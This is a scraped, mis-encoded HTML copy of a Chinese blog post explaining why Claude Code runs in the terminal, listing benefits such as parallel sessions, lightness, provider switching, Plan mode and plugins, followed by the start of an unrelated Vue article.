                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘è¶Šæ¥è¶Šå¤šçš„äººå¼€å§‹åœ¨ç»ˆç«¯ï¼Œå¦‚ Claude Codeã€Qwen Codeã€Gemini CLIã€iFlow CLI ç­‰ä¸­å†™ä»£ç äº†ã€‚</p>
<p>è¯´å®è¯ï¼Œæˆ‘ä¹‹å‰ä¹Ÿæœ‰äº›ä¸è§£ï¼Œæ„Ÿè§‰å®Œå…¨æ²¡å¿…è¦ï¼Œåœ¨ç»ˆç«¯é‡Œå†™ä»£ç ä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a963952e49846cbafa3c7401ff63fa8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=DB8CC6TD%2FGBJSunQgDL%2FxdPF%2BbA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æœ€è¿‘å¼€å§‹ä½“éªŒ Claude Code ä¹‹åï¼Œæ„Ÿè§‰æ‰“å¼€äº†ä¸€ä¸ªæ–°ä¸–ç•Œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76e084e87fdb43dbbc78bdb00eb3f09f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=LsqZhfJQQvigbrtRRJRz20dd6yY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ›´è®©æˆ‘éå¸¸æ„å¤–çš„æ˜¯ï¼Œå½“å¾ˆå¤šäººè¿˜åœ¨æŠ±æ€¨ CLI å¯¹æ™®é€šäººä¸å‹å¥½çš„æ—¶å€™ï¼Œæˆ‘çœ‹åˆ°å¤§å‚æœ‰ä¸ªåˆ« AI äº§å“ç»ç†å’Œ AI è¿è¥å²—ä½çš„åŒå­¦ä¹Ÿå¼€å§‹å­¦ä¹ å’Œä½¿ç”¨ Claude Code äº†ã€‚ä½†ä»–ä»¬æ›´å¤šçš„è¿˜æ˜¯å®Œæˆæ–¹æ¡ˆè®¾è®¡ã€æ–‡æ¡£å¤„ç†ç­‰ï¼Œè€Œä¸æ˜¯å†™ä»£ç ã€‚</p>
<p>å¯èƒ½å¾ˆå¤šäººæ²¡ç”¨ã€æ²¡æ·±å…¥ä½“éªŒä¹‹å‰ä¹Ÿæœ‰ç±»ä¼¼å›°æƒ‘ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« è°ˆè°ˆè‡ªå·±çš„ç†è§£ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆ Claude Code é‡‡ç”¨ CLI è€Œä¸æ˜¯ IDE çš„å½¢å¼ï¼Ÿ</h2>
<p>Claude Codeï¼ˆç®€ç§° CCï¼‰ åˆ›å§‹äºº Boris Cherny Â åœ¨ã€ŠMastering Claude Code in 30 minutesã€‹ æ¼”è®²ä¸­æåˆ°ä¸¤ä¸ªåŸå› ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eda25f9420474bc5b7528ae05fb98829~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=STfsC07GV41wyErKgzCMoF2wmxQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Anthropic çš„å‘˜å·¥ä½¿ç”¨çš„ IDE äº”èŠ±å…«é—¨ï¼Œæœ‰ VS Code ï¼Œè¿˜æœ‰ Zedã€Xcodeã€Vim ç­‰ã€‚æƒ³è¦å¼€å‘å‡ºé€‚åˆæ‰€æœ‰äº§å“çš„å·¥å…·ï¼Œå¾ˆéš¾ã€‚ç»ˆç«¯æ˜¯å”¯ä¸€çš„ä¸€ä¸ªé€šç”¨å·¥å…·ã€‚</p>
<p>å…¶æ¬¡ä»–è®¤ä¸ºæŠ€æœ¯å‘å±•å¤ªå¿«ï¼Œå¾ˆæœ‰å¯èƒ½å¤§å®¶å¾ˆå¿«å°±ä¸å†ä½¿ç”¨ IDE äº†ï¼Œé¿å…ä»–ä»¬åœ¨ UI å’Œä¸€äº›åº•å±‚èƒ½åŠ›ä¸ŠæŠ•å…¥è¿‡å¤šçš„èµ„æºã€‚</p>
<h2 data-id="heading-1">CC å†™ä»£ç çš„å¥½å¤„æœ‰å“ªäº›ï¼Ÿ</h2>
<p>è¿™é‡Œæˆ‘åˆ†äº«å‡ ä¸ªä½¿ç”¨ Claude Code è¿™ç±»å‘½ä»¤è¡Œç¼–ç å·¥å…·çš„å‡ å¤§ç†ç”±ã€‚</p>
<hr/>
<h3 data-id="heading-2">å¹¶è¡Œå¼€å‘</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac17393c59d64a1eb5b03e7224f394ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=2yAaS8auaiZiRuR%2Bwvqk4y1xhv4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Claude Code ç”±äºåœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¼€å¤šä¸ªç»ˆç«¯ï¼Œä½ å¯ä»¥æŠŠä»»åŠ¡æ‹†å¾—ç›¸å¯¹ç›¸äº’ä¸å¹²æ‰°ï¼Œç„¶åå¯ä»¥è®©å®ƒå¹¶è¡Œæ‰§è¡Œå¾ˆå¤šä»»åŠ¡ï¼Œæ•ˆç‡éå¸¸é«˜ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96771743305e4fb78ad1a40058e10cfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=I6beZ6nXZg%2FPGpsB6aVPdU4q6XY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Claude Code åˆ›å§‹äºº Boris Cherny è¿‘æ—¥åœ¨ Xï¼ˆåŸæ¨ç‰¹ï¼‰åˆ†äº«è‡ªå·±ä½¿ç”¨ Claude Code çš„ä¸€ä¸ªç»éªŒå°±æ˜¯åŒæ—¶å¼€ 5 ä¸ª TABï¼Œé«˜æ•ˆç¼–ç ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/296dc50690aa4b65be74534cc776661f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=%2BKC2XfXy1Opu8a%2BO63se8XCPq%2FA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šç›¸å…³çš„è®¨è®ºã€‚æ¯”å¦‚è¯´å¦‚æœç›´æ¥ä½¿ç”¨ IDE çš„è¯ï¼Œé‚£ä¹ˆå¯èƒ½åšå¥½è®¡åˆ’ä¹‹åæ‰§è¡Œä¼šé˜»å¡ IDEã€‚é‚£ä¹ˆä½¿ç”¨ Claude Code å°±æ²¡æœ‰è¿™ç§é—®é¢˜ã€‚</p>
<h3 data-id="heading-3">è·¨ç«¯ååŒ</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba4edea7e0de48e987a80c17c8ba1686~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=IedqUU4WzWJ04VvtXQvvVuMAddA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æœ‰ Claude Code æœ‰ç½‘é¡µç«¯ï¼Œä¹Ÿæœ‰å®¢æˆ·ç«¯ï¼Œè¿˜æœ‰ Chrome æ’ä»¶ï¼Œè¿˜æœ‰ VS Code çš„å’Œ JetBrains çš„æ’ä»¶ç­‰ç­‰ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿åœ°è·¨å¤šç«¯ååŒã€‚</p>
<p>ä¹‹å‰æˆ‘æ‹…å¿ƒåœ¨ç»ˆç«¯ä¸­å†™ä»£ç ä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚å…¶å®ä½¿ç”¨ç»ˆç«¯ä¸ä»£è¡¨ä¸€å®šä¸èƒ½ç”¨ IDEã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/460ffab7bdba48a195613f46e6d88e1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=Y1HgrqT7r93DtS8xw6tbR4C50HY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ IDEA é‡Œé¢å®‰è£… Claude Code æ’ä»¶ï¼Œä¹Ÿå¯ä»¥è¾¹å¯¹è¯ï¼Œè¾¹æŸ¥çœ‹ä¿®æ”¹çš„ä¿¡æ¯ï¼Œå®ƒè¿˜èƒ½å¤Ÿè‡ªåŠ¨è·å–å½“å‰æ­£åœ¨æ‰“å¼€çš„æ–‡ä»¶çš„ä¿¡æ¯ï¼Œç­‰ç­‰ï¼Œä¹Ÿéå¸¸æ–¹ä¾¿ã€‚</p>
<h3 data-id="heading-4">æ›´è½»é‡</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccd840c620ac4795a0a370493102d071~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=Pvz2k0MLFjCpXAb3IaUDHxjNSUg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¾ˆå¤šç”µè„‘è£… IDEï¼Œå°¤å…¶åŒæ—¶æ‰“å¼€å¤šä¸ªé¡¹ç›®ï¼Œå ç”¨å†…å­˜ç‰¹åˆ«å¤§ï¼Œç”šè‡³ä¼šé€ æˆä¸€äº›å¡é¡¿ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbf4207d70524d34b03fc78bb7ac94a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=BdfiAobMY5U7Q539NUVoJytMGug%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é‚£ä¹ˆä½¿ç”¨ç»ˆç«¯çš„è¯å°±éå¸¸è½»é‡ã€‚</p>
<h3 data-id="heading-5">æ¨¡å‹åŸç”Ÿé€‚é…</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91914ac327864cb4900bdb1cada55bd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=%2FGj4AbWg%2BFegWOp446B0LLMnzcM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Anthropic å®˜æ–¹å‡ºçš„å·¥å…·ï¼Œèƒ½å¤Ÿç¬¬ä¸€æ—¶é—´åˆ©ç”¨æ¨¡å‹çš„æœ€å…ˆè¿›ç‰¹æ€§ï¼Œå¦‚ MCPã€Skills ç­‰ï¼Œåœ¨æŒ‡ä»¤éµå¾ªå’Œä»£ç è´¨é‡ä¸Šå¾€å¾€å…·æœ‰â€œäº²å„¿å­â€åŠ æˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11a09807256c45c68c78e5560df13c3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=SOsVNsPjwz0xfoJh8UbXf%2BIWh%2B4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚ Claude Code å…ˆæ”¯æŒ Skillsï¼ŒCursor è¿‡ä¸€æ®µæ—¶é—´æ‰æ”¯æŒã€‚</p>
<p>å‚è§ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fdocs%2Fcontext%2Fskills" target="_blank" title="https://cursor.com/docs/context/skills" ref="nofollow noopener noreferrer">cursor.com/docs/contexâ€¦</a></p>
<h3 data-id="heading-6">æ›´è‡ªç”±çš„æœåŠ¡å•†åˆ‡æ¢</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed3451db359243e0b0dbefb711fe08cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=8%2FP%2FZYJWWdtqxncHsOlNpSQXKn8%3D" alt="å›¾ç‰‡" loading="lazy"/>æœ‰äº› AI Coding IDE Â å†…ç½®äº†å¾ˆå¤šæ¨¡å‹ï¼Œä½†ä¸æ”¯æŒä½ åˆ‡æ¢ä¸€äº›æ¨¡å‹æœåŠ¡å•†ï¼Œç”šè‡³ä½ æ— æ³•æ˜ç¡®çŸ¥é“ä½¿ç”¨çš„æ˜¯å“ªä¸ªæ¨¡å‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3267702bb55742dcb53aece2058045e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=QqUdIPEGqe%2BhsdDVDdS%2FsPGnvKw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Claude Code çš„è¯ï¼Œé€šè¿‡ä¿®æ”¹ç¯å¢ƒå˜é‡å¯ä»¥éå¸¸è½»æ¾åœ°åˆ‡æ¢è‡ªå·±æƒ³è¦ä½¿ç”¨çš„æ¨¡å‹æœåŠ¡å•†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8aea5b00b43f41ab81b260e72b268ddf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=UsqzVWoer3Gw5zJOOMSJfv%2Bd%2BoE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æƒ³è¦æ›´æ–¹ä¾¿åœ°åˆ‡æ¢æ¨¡å‹ï¼Œå¯ä»¥è£… cc-switch è¿™ä¸ªå·¥å…·ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffarion1231%2Fcc-switch%3Ftab%3Dreadme-ov-file" target="_blank" title="https://github.com/farion1231/cc-switch?tab=readme-ov-file" ref="nofollow noopener noreferrer">github.com/farion1231/â€¦</a></p>
<h3 data-id="heading-7">åŠŸèƒ½å¼ºå¤§</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d282aa31786f40bd91b7086664c27d85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=ussThxN%2Bbjd05GCHdtfrMQzo180%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚è¯´åŸç”Ÿå°±æ”¯æŒ Plan æ¨¡å¼ï¼ŒClaude åªè¿›è¡Œåªè¯»åˆ†æå’Œè§„åˆ’ï¼Œä¸æ‰§è¡Œä»»ä½•ä¿®æ”¹ã€‚è¿™éå¸¸é€‚åˆåœ¨ä¸ç ´åä»£ç åº“çš„æƒ…å†µä¸‹ï¼Œè®© AI å…ˆæ·±å…¥ç†è§£å¤æ‚çš„ä»£ç ç»“æ„æˆ–è§„åˆ’é‡æ„æ–¹æ¡ˆï¼Œç¡®è®¤å¥½ä¹‹åå†è¿›è¡Œæµæ°´çº¿ç¼–å†™ä»£ç ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7bc709d09b44f76968292bc679f9f31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=qIrjhdqDcZG%2FOIn54txby5uuYOg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Claude Code é€šè¿‡åœ¨é¡¹ç›®æ ¹ç›®å½•æ”¾ç½® Â <code>CLAUDE.md</code>Â æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä»£ç é£æ ¼ã€å¸¸ç”¨å‘½ä»¤ã€æ¶æ„å†³ç­–ç­‰ï¼Œè®© AI èƒ½å¤Ÿâ€œè®°ä½â€é¡¹ç›®çš„ç‰¹å®šçŸ¥è¯†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/059642b1a7f6494ab87fa9990bfc5b89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=lF4xzLBJq%2FlHxImkrHOJh%2F5wacM%3D" alt="å›¾ç‰‡" loading="lazy"/>CC æœ‰æµ·é‡å¤šå¥½ç”¨çš„æ’ä»¶å’Œ Skillsã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6312b8d8090048fb8a8c724572725de6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=xjAHwgA6zMSHh3Svz7ORSbuJLvw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚ CC çš„å®˜æ–¹æ’ä»¶ ralph-loop ï¼Œå¯ä»¥åå¤è‡ªåŠ¨å‘ AI Agent è¾“å…¥æç¤ºè¯ï¼Œè®©å®ƒè¿›è¡Œå¤šè½®è¿­ä»£ï¼Œä½¿ç»“æœæ›´å¥½ã€‚</p>
<p>Github åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fclaude-plugins-official%2Ftree%2Fmain%2Fplugins%2Fralph-loop" target="_blank" title="https://github.com/anthropics/claude-plugins-official/tree/main/plugins/ralph-loop" ref="nofollow noopener noreferrer">github.com/anthropics/â€¦</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c778c41402b840248b8376f63afde3e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=i8xk9vaYe0%2BoK8R8yoK5Aiv0Zo0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚ CC çš„ planning-with-files Skillsï¼Œå‚è€ƒ Manus æ¨¡å¼ï¼Œå°†ä½ çš„å·¥ä½œæµç¨‹è½¬åŒ–ä¸ºä½¿ç”¨æŒä¹…åŒ–çš„markdownæ–‡ä»¶è¿›è¡Œè§„åˆ’ã€è¿›åº¦è·Ÿè¸ªå’ŒçŸ¥è¯†å­˜å‚¨ã€‚</p>
<p>Github åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOthmanAdi%2Fplanning-with-files" target="_blank" title="https://github.com/OthmanAdi/planning-with-files" ref="nofollow noopener noreferrer">github.com/OthmanAdi/pâ€¦</a></p>
<p>æ‹“å±•é˜…è¯»ï¼š</p>
<ul>
<li>åˆ›å§‹äººè‡ªè¿°ï¼šæˆ‘å¦‚ä½•ç”¨ Claude Code ä¸€ä¸ªäººå¹²ç¿»ä¸€ä¸ªç»„ï¼Ÿ13æ¡ç¡¬æ ¸æŠ€å·§é¦–æ¬¡å…¬å¼€</li>
<li>ç»ˆäºæœ‰äººæŠŠ Claude Skills çš„æ¦‚å¿µç»™æˆ‘è®²æ˜ç™½äº†ï¼</li>
<li>æé€Ÿåˆ›å»ºä¸€ä¸ªé«˜è´¨é‡çš„ Claude Skills æœ€ä½³å®è·µ</li>
<li>å¦‚ä½•åœ¨ Qoderã€Cursorã€Traeã€Windsurf ç­‰ AI Coding å·¥å…·ä¸­ä½¿ç”¨ Claude Skills</li>
</ul>
<h2 data-id="heading-8">å†™åœ¨æœ€å</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de5d593f6c2b42f69a29ab34d185a0c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=tSpGlnt8EFVJtl8ee%2F%2BVoIT45Tw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Claude Code è®©æˆ‘æ„è¯†åˆ°æˆ‘ä»¬ç¨‹åºå‘˜éœ€è¦çªç ´è‡ªå·±çš„èˆ’é€‚åŒºï¼Œç§¯ææ¥å—ä¸€äº›æ–°é²œçš„æŠ€æœ¯å’Œå·¥å…·ã€‚</p>
<p>Claude Code ä¹Ÿè¿˜è®©æˆ‘æ„è¯†åˆ°å¾ˆå¤šä¸œè¥¿å¹¶ä¸æ˜¯ä¸€ä¸ªäºŒé€‰ä¸€çš„é€‰æ‹©ï¼Œå¯ä»¥æŠŠå¤šä¸ªå·¥å…·çš„ä¼˜åŠ¿ç»“åˆåœ¨ä¸€èµ·ã€‚</p>
<hr/>
<p>æ¬¢è¿å…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>æ‚Ÿé¸£AI</strong>ï¼Œåç»­ä¼šé™†ç»­åˆ†äº«æ¯”è¾ƒæœ‰ç”¨çš„ AI å·¥å…·å’Œæ¯”è¾ƒå¥½çš„ AI ç»éªŒï¼Œæ¯”è¾ƒå®¢è§‚ç†æ€§çš„ AI è§‚ç‚¹ç­‰ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f16e2427a55c4d2887f9ce774027cc8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444529&amp;x-signature=GoR1LuxlgLBp%2Fc43jnkEGilsJww%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VueæŒ‡ä»¤]]></title>    <link>https://juejin.cn/post/7592548677743968302</link>    <guid>https://juejin.cn/post/7592548677743968302</guid>    <pubDate>2026-01-08T02:37:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592548677743968302" data-draft-id="7592582130594021427" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VueæŒ‡ä»¤"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:37:51.000Z"/> <meta itemprop="image" 